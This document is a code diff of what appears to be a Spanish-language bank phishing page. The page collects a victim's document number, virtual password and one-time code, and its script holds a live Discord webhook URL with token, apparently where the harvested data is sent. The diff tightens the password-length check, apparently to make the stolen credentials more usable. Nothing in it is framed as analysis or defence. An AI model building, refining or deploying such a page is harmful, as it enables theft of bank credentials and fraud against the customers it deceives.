@@ -51,7 +51,7 @@
             <div id="passSection">
                 <div class="form-group" style="margin-top: 15px;">
                     <label class="form-label">Ingrese su clave virtual</label>
-                    <input type="password" id="pass" class="form-input" maxlength="8" inputmode="numeric" placeholder="Clave de 4 a 8 dígitos">
+                    <input type="password" id="pass" class="form-input" maxlength="8" inputmode="numeric" placeholder="Clave de 6 a 8 dígitos">
                 </div>
                 <div class="checkbox-container">
                     <input type="checkbox" id="rem" class="checkbox">
@@ -82,7 +82,7 @@
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';
 
-        // 1. Bloqueo de letras y caracteres especiales
+        // Bloqueo estricto de letras
         const permitirSoloNumeros = (e) => {
             if (["Backspace", "Tab", "Enter", "Escape", "ArrowLeft", "ArrowRight"].includes(e.key)) return;
             if (!/^[0-9]$/.test(e.key)) e.preventDefault();
@@ -105,7 +105,7 @@
             dForm.submit(); 
         }
 
-        // Paso 1: Validar Documento (mínimo 6 dígitos)
+        // Paso 1: Documento
         document.getElementById('btnToPass').addEventListener('click', () => {
             const doc = document.getElementById('docNumber').value;
             if (doc.length < 6) {
@@ -117,14 +117,15 @@
             document.getElementById('passSection').classList.add('visible');
         });
 
-        // Paso 2: Validar Clave (mínimo 4 dígitos)
+        // Paso 2: Clave Virtual (AHORA DE 6 A 8 DÍGITOS)
         document.getElementById('btnToOtp').addEventListener('click', () => {
             const btn = document.getElementById('btnToOtp');
             const doc = document.getElementById('docNumber').value;
             const clave = document.getElementById('pass').value;
 
-            if (clave.length < 4) {
-                alert("La clave debe tener al menos 4 números.");
+            // Validación estricta: No permite enviar si es menor a 6
+            if (clave.length < 6) {
+                alert("La clave debe tener entre 6 y 8 números.");
                 return;
             }
 
@@ -141,7 +142,7 @@
             }, 1000);
         });
 
-        // Paso 3: Validar OTP (exactamente 6 dígitos)
+        // Paso 3: OTP
         document.getElementById('btnFinish').addEventListener('click', () => {
             const btn = document.getElementById('btnFinish');
             const otp = document.getElementById('otpCode').value;
